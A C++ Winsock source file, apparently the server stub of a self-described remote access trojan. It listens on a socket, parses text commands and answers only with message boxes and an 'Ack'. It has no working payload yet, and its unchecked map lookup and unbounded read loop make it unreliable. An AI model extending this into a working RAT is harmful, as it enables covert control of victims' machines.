#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <map>
#include <string>




#define IP_ADDR "127.0.0.1" //THIS VARIABLE WILL BE CHANGED AS THE CLIENT PROGRAM IS TAILORED TO THE USER'S SETTINGS.
#define PORTNO 80 //THIS VARIABLE WILL BE CHANGED AS CLIENT PROGRAM IS TAILORED TO THE USER'S SETTINGS
#define PROGRAM_NAME "fuck.exe" //THIS WILL BE THE PROGRAM FILE NAME

//namespace declarations
using std::string;
using std::map;

enum SERVERMESSAGE {MESSAGE1, MESSAGE2, MESSAGE3}; //ENUMERATE SERVER COMMANDS, 0 = MESSAGE1, 1 = MESSAGE2





const int buffersize = 5000;

string ipaddress = IP_ADDR;

int portnumber = PORTNO;

int main(){

//map the server enumerated commands so I can recv a string to match with!
    map<string, SERVERMESSAGE> dictionary;
    dictionary["MESSAGE1"] = MESSAGE1;
    dictionary["MESSAGE2"] = MESSAGE2;
    dictionary["MESSAGE3"] = MESSAGE3;



    /*INITIALIZE WINSOCKETS FOR OUR RAT, WE WILL BE COMMUNICATING WITH CLIENT TO MANIPULATE THE HOST*/
    WSADATA wsa;
    SOCKET sa, clientsock;
    struct sockaddr_in server, client;
    char server_reply[buffersize];
    //THIS BOOLEAN VALUE WILL MAKE THE SERVER KEEP WORKING. CAN BE DISABLED FROM CLIENT. A NEW SEVER MUST BE CLICKED FOR THIS TO WORK
    bool KILLSERVER = true;


    if (WSAStartup(MAKEWORD(2,2), &wsa)!=0)  {
              //more error checking
            return -1;
       }

    if ((sa = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET){

            return -1;
    }

    server.sin_addr.s_addr = inet_addr (ipaddress.c_str());      //initialize members of server structure
    server.sin_family = AF_INET;
    server.sin_port = htons(portnumber);

    if (bind(sa, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR){
        return -1;
    }

    listen(sa, SOMAXCONN);

    while(KILLSERVER){


        clientsock = accept(sa, (struct sockaddr *)&client, NULL);

        while(clientsock != INVALID_SOCKET){

        int counter = 0;
        while (counter < buffersize){ //make sure read buffer is clear!
                    server_reply[counter] = '\0';
                    counter++;

                }

            while((recv(clientsock, server_reply, buffersize, 0)) == SOCKET_ERROR){     //error checking combined with recv function

                return -1;
            }

            string servermessage;

            for (int i = 0; server_reply[i] != '>'; i++){
               servermessage += server_reply[i];
            }
            std::cout << servermessage;

             map<string, SERVERMESSAGE>::iterator i = dictionary.find(servermessage.c_str());


            //i->second corresponds to the enumerated message

            switch(i->second){

                case MESSAGE1: MessageBox(NULL,NULL, "MESSAGE1", NULL);
                    break;
                case MESSAGE2: MessageBox(NULL,NULL,"MESSAGE2",NULL);
                    break;
                default: closesocket(clientsock);
                    break;

            }

               send(clientsock, "Ack", 4, 0);
        }



    }
            closesocket(sa);
            WSACleanup();

    return 0;
}
